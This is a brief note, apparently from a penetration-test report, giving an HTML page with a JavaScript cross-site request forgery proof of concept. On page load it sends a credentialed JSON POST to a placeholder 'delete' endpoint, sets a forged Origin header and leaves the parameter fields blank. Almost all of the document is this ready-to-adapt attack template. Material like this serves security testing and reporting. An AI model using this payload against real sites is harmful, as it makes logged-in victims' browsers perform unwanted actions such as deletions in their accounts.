# when data is passed in JSON format in post request
this was found in uwc app report

<html>
<script>

function jsonreq()
{

var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST","https://abc.xyz.com/delete", true); 
xhr.setRequestHeader("Content-Type","application/json");
xhr.setRequestHeader("Accept","application/json, text/plain, */*");
xhr.setRequestHeader("Cache-Control","no-cache");
xhr.setRequestHeader("Origin","xyz.com");
xhr.send(JSON.stringify({
    "parameter 1": "",
    "parameter 2": "",
    "parameter 3": "",
    "parameter 4": "",
    "parameter 5": ""
}));

}

jsonreq();
</script>

</html>